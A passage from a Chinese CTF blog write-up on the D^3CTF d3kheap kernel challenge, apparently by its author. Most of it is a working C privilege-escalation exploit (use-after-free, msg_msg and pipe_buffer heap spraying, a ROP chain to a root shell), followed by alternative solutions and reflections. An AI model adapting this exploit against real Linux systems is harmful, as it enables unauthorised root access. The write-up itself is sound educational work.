size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>        &#123;<br>            <span class="hljs-comment">// printf(&quot;[-] now %d, num %d\n&quot;, i, j);</span><br>            <span class="hljs-keyword">if</span> (write(sk_socket[i][<span class="hljs-number">0</span>], buf, size) &lt; <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">freeSkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>            <span class="hljs-keyword">if</span> (read(sk_socket[i][<span class="hljs-number">1</span>], buf, size) &lt; <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (getuid())<br>        errExit(<span class="hljs-string">&quot;failed to gain the root!&quot;</span>);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span>         oob_pipe_fd[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         sk_sockets[SOCKET_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         pipe_fd[PIPE_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         msqid[MSG_QUEUE_NUM];<br>    <span class="hljs-type">int</span>         victim_qid, real_qid;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg_prim</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">pipe_buf_ptr</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops_ptr</span>;</span><br>    <span class="hljs-type">uint64_t</span>    victim_addr;<br>    <span class="hljs-type">uint64_t</span>    kernel_base;<br>    <span class="hljs-type">uint64_t</span>    kernel_offset;<br>    <span class="hljs-type">uint64_t</span>    *rop_chain;<br>    <span class="hljs-type">int</span>         rop_idx;<br>    <span class="hljs-type">cpu_set_t</span>   cpu_set;<br><br>    saveStatus();<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.O</span><br><span class="hljs-comment">     * Initialization</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-comment">// run the exp on specific core only</span><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>    <br>    <span class="hljs-comment">// socket pairs to spray sk_buff</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, sk_sockets[i]) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create socket pair!&quot;</span>);<br>    <br>    dev_fd = open(<span class="hljs-string">&quot;/dev/d3kheap&quot;</span>, O_RDONLY);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.I</span><br><span class="hljs-comment">     * build msg_queue, spray primary and secondary msg_msg,</span><br><span class="hljs-comment">     * and use OOB write to construct the overlapping</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Build message queue...&quot;</span>);<br>    <span class="hljs-comment">// build 4096 message queue</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT)) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create msg_queue!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(&amp;primary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(primary_msg));<br>    <span class="hljs-built_in">memset</span>(&amp;secondary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(secondary_msg));<br><br>    <span class="hljs-comment">// get a free object</span><br>    add();<br><br>    <span class="hljs-comment">// spray primary and secondary message</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">4</span>] = i;<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i], &amp;primary_msg, <br>                <span class="hljs-keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to send primary msg!&quot;</span>);<br><br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">4</span>] = i;<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to send secondary msg!&quot;</span>);<br>        <br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">1024</span>)<br>            del();<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.II</span><br><span class="hljs-comment">     * construct UAF</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// free the victim secondary msg_msg, then we get a UAF</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Trigger UAF...&quot;</span>);<br>    del();<br><br>    <span class="hljs-comment">// spray sk_buff to mark the UAF msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff...&quot;</span>);<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, SECONDARY_MSG_SIZE, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br><br>    <span class="hljs-comment">// find out the UAF queue</span><br>    victim_qid = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * the msg_msg got changed, so we can&#x27;t read out</span><br><span class="hljs-comment">         * but it tells us which one the victim is</span><br><span class="hljs-comment">        */</span><br>        <span class="hljs-keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, <span class="hljs-keyword">sizeof</span>(secondary_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] victim qid: %d\n&quot;</span>, i);<br>            victim_qid = i;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (victim_qid == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;failed to make the UAF in msg queue!&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.III</span><br><span class="hljs-comment">     * spray sk_buff to leak msg_msg addr</span><br><span class="hljs-comment">     * construct fake msg_msg to leak addr of UAF obj</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// spray sk_buff to construct fake msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff...&quot;</span>);<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-comment">// use fake msg_msg to read OOB</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] OOB read from victim msg_msg&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br><br>    nearby_msg = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n&quot;</span>, <br>            nearby_msg-&gt;m_list.prev);<br><br>    <span class="hljs-comment">// release and re-spray sk_buff to construct fake msg_msg</span><br>    <span class="hljs-comment">// so that we can make an arbitrary read on a primary msg_msg</span><br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    <br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-keyword">sizeof</span>(oob_msg.mtext), <br>            nearby_msg-&gt;m_list.prev - <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[<span class="hljs-number">0x1000</span>] != MSG_TAG)<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br>    <br>    <span class="hljs-comment">// cal the addr of UAF obj by the header we just read out</span><br>    nearby_msg_prim = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="hljs-number">0x400</span>;<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n&quot;</span>, <br>            nearby_msg_prim-&gt;m_list.next);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n&quot;</span>, victim_addr);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.IV</span><br><span class="hljs-comment">     * fix the header of UAF obj and release it</span><br><span class="hljs-comment">     * spray pipe_buffer and leak the kernel base</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// re-construct the msg_msg to fix it</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">memset</span>(fake_secondary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(fake_secondary_msg));<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            victim_addr + <span class="hljs-number">0x800</span>, victim_addr + <span class="hljs-number">0x800</span>, <span class="hljs-comment">// a valid kheap addr is valid</span><br>            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <br>            <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-comment">// release UAF obj as secondary msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release UAF obj in message queue...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (readMsg(msqid[victim_qid], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>    <br>    <span class="hljs-comment">// spray pipe_buffer</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create pipe!&quot;</span>);<br>        <br>        <span class="hljs-comment">// write something to activate it</span><br>        <span class="hljs-keyword">if</span> (write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to write the pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// release the sk_buff to read pipe_buffer, leak kernel base</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) &amp;fake_secondary_msg;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (read(sk_sockets[i][<span class="hljs-number">1</span>], &amp;fake_secondary_msg, <br>                    <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>                errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>            <br>            <span class="hljs-keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="hljs-number">0xffffffff81000000</span>)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n&quot;</span>, <br>                        pipe_buf_ptr-&gt;ops);<br>                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;<br>                kernel_base = <span class="hljs-number">0xffffffff81000000</span> + kernel_offset;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n&quot;</span>, <br>            kernel_base, kernel_offset);<br>    <br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.V</span><br><span class="hljs-comment">     * hijack the ops of pipe_buffer</span><br><span class="hljs-comment">     * free all pipe to trigger fake ptr</span><br><span class="hljs-comment">     * so that we hijack the RIP</span><br><span class="hljs-comment">     * construct a ROP on pipe_buffer</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pre-construct data in userspace...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) fake_secondary_msg;<br>    pipe_buf_ptr-&gt;page = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    pipe_buf_ptr-&gt;ops = victim_addr + <span class="hljs-number">0x100</span>;<br><br>    ops_ptr = (<span class="hljs-keyword">struct</span> pipe_buf_operations *) &amp;fake_secondary_msg[<span class="hljs-number">0x100</span>];<br>    ops_ptr-&gt;release = PUSH_RSI_POP_RSP_POP_4VAL_RET + kernel_offset;<br><br>    rop_idx = <span class="hljs-number">0</span>;<br>    rop_chain = (<span class="hljs-type">uint64_t</span>*) &amp;fake_secondary_msg[<span class="hljs-number">0x20</span>];<br>    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;<br>    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;<br>    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;<br>    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="hljs-number">22</span>;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = getRootShell;<br>    rop_chain[rop_idx++] = user_cs;<br>    rop_chain[rop_idx++] = user_rflags;<br>    rop_chain[rop_idx++] = user_sp;<br>    rop_chain[rop_idx++] = user_ss;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-comment">// for gdb attach only</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] gadget: %p\n&quot;</span>, kernel_offset + PUSH_RSI_POP_RSP_POP_4VAL_RET);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] free_pipe_info: %p\n&quot;</span>, kernel_offset + FREE_PIPE_INFO);<br>    sleep(<span class="hljs-number">5</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++)<br>    &#123;<br>        close(pipe_fd[i][<span class="hljs-number">0</span>]);<br>        close(pipe_fd[i][<span class="hljs-number">1</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行即可完成提权，成功率比笔者最初拍脑门想的解法要高得多XD</p><p><img src="https://s2.loli.net/2022/05/17/vZhdoFP5TgRc9Ul.png" alt="image.png"></p><h1>0x03.其他的预期解</h1><p>除了笔者的官方解法以外，笔者认为以下方法应当也能解开本题（笔者未进行尝试）：</p><ul><li>由于整个文件系统是直接在内存中的，因此可以直接搜索内存寻找 flag（笔者本人并不推荐这种专注于 flag 本身的解法）</li><li>直接分配其他可以劫持 RIP 的结构体，然后爆破内核 .text 段偏移，在 pt_regs 上构造 ROP</li><li>slub 大师通过巧妙构造泄露出 cookie 与堆上地址，然后劫持 freelist（笔者有思路但笔者认为这种解法过于麻烦 + 没有必要）<ul><li>泄露出内核基址后后写一些全局指针（例如 <code>n_tty_ops</code>）</li><li>利用 prctl 修改 current_task 的 comm 成员，暴力搜索内存找到 cred</li></ul></li><li>将 double free 应用到其他的结构体上，使其转换为一个已知的 CVE 后直接打</li><li>利用 0day 或是（笔者不知道的） 1day 直接打 kernel</li></ul><h1>0x04.解题情况与非预期</h1><p>这一次的 D^3CTF 中笔者的题是第二批放出的，但在笔者放出题目后不久便被 W&amp;M 战队拿下了一血，而整个比赛中解出了这道题目的队伍也达到了 8 支之多，笔者原以为是自身出题水准不足以至于出的题目只有签到题水平于是被各大战队秒杀（虽然笔者本身就很菜），但事情往往没有笔者所想的那么简单</p><p>在比赛结束时，我们发放了一份调查问卷，而笔者在其中看到了一条对笔者题目的评价——</p><p><img src="https://s2.loli.net/2022/03/08/64O12YCIPXuj35t.png" alt="image.png"></p><p>笔者在看到这条消息之后整个大脑一片空白，马上从比赛平台上下载下来题目附件，解压，果然在 <code>/tmp</code> 目录下看到了一个熟悉的 <code>exp</code> 文件…</p><p><img src="https://s2.loli.net/2022/03/08/gartTlFBis2xALv.png" alt="image.png"></p><p>赛后笔者查阅选手们的 wp，<strong>确乎是有一半的队伍利用笔者留下来的 exp 解出了这道题</strong>，这也令这道题的做题体验大打折扣，在这里笔者向大家献上最诚挚的歉意🙇🏽‍♂️🙇🏽‍♂️🙇🏽‍♂️！！！</p><p>不过比较幸运的一点是笔者本地测试时是直接在根目录下测试的，因此 setxattr 的第一个参数是 <code>/exp</code>，而对于远程环境而言根目录对选手是不可写的，选手的 exp 路径应当为 <code>/tmp/exp</code>，这也让这个 exp 无法被直接打通（否则可能解题队伍数量还得翻个数十倍…），不过选手仍可以逆向出 exp 逻辑后进行修改</p><p>wp 中只有四支队伍是正常做题的，解法基本上都是预期解——使用 <code>msg_msg</code> 泄露信息与 <code>pipe_buffer</code> 劫持 RIP，不过都比笔者这个笨拙的解法要优秀上许多（笑），基本上可以归为两种题解：</p><ul><li>喷射 pipe_buffer 与 sk_buff，参照 CVE-2021-22555 的解法完成解题（3支队伍）</li><li>喷射大量 pipe_buffer 后直接用 setxattr 修改 msg_msg 越界读泄露出 kernel base，修改 msg_msg-&gt;next 到 <code>vmemmap_base</code> 前 8 字节（刚好为 NULL），这个地方存放了几个全局变量（指向 <code>vmemmap_base</code>、<code>vmalloc_base</code>、<code>page_offset_base</code> 的指针等都在这里），读出“堆基址”后用一个堆上地址修复 msg_msg 的 header，然后劫持 pipe_buffer。这个解法和笔者的解法基本上是一样的</li></ul><p>笔者在出题过程中其实也看到了 CVE-2021-22555，这个漏洞本身是一个 off-by-null，最后转化为一个 UAF 进行利用，因此与笔者的这道题最终是可以殊途同归的，事实证明正常解题的队伍基本上都参照了这个漏洞（笑），不过笔者还是希望能够探索出一条别的道路，所以你在上面看到的笔者的解法其实与这个漏洞的利用过程并非是完全一样的</p><blockquote><p>外国友人对本题的评价：</p><blockquote><p>This is a standard kernel pwn challenge. We are given an unprivileged shell in a Linux VM, and the flag can only be read by root. The VM loads a vulnerable kernel module, which we have to exploit to gain root privileges and read the flag.</p></blockquote><p>说实话这一次出题确实还是比较常规，希望笔者明年能够想到一些更好的东西XD</p></blockquote><h1>0x05.总结与反思</h1><p>虽然在官方解法中使用了“看似非常通用的解法”解出了这道题，但笔者其实是不太满意的：</p><ul><li>该方法仅适用于较大的 object，对于小一点的 object 或者 kmem_cache-&gt;offset 为 0 的情况则<strong>很容易让我们无法修复 msg_msg，甚至就无法分配 msg_msg</strong> （小于 0x30 的情况）</li><li>在劫持 RIP 的过程当中<strong>仍然需要根据 object 大小去找对应的可用结构体</strong>，而没有一个更加<strong>通用</strong>的劫持控制流的办法，这无疑造成了相当程度的限制</li><li>对于独立的 kmem_cache 而言<strong>无法使用该方法进行利用</strong>，因为此时 msg_msg 不从该处分配</li><li><strong>真实环境中在进行内存分配的并非只有我们</strong>，很容易被其他进程拿到 freelist 造成 kernel panic</li><li>这个方法似乎并不能在泛 Linux 平台上通用（据悉 Android 并不能使用这一套 IPC API，笔者尚未查证）</li></ul><p>因此笔者认为这道题目充其量能在 D3CTF 这一档次的比赛中充当签到题，但笔者还是希望笔者对“通解”的探索能够给大家带来一些新的思考（笑）</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;听说 sb 出题人把 exp 也给打包发布了，比赛结束才发现&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://blog.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
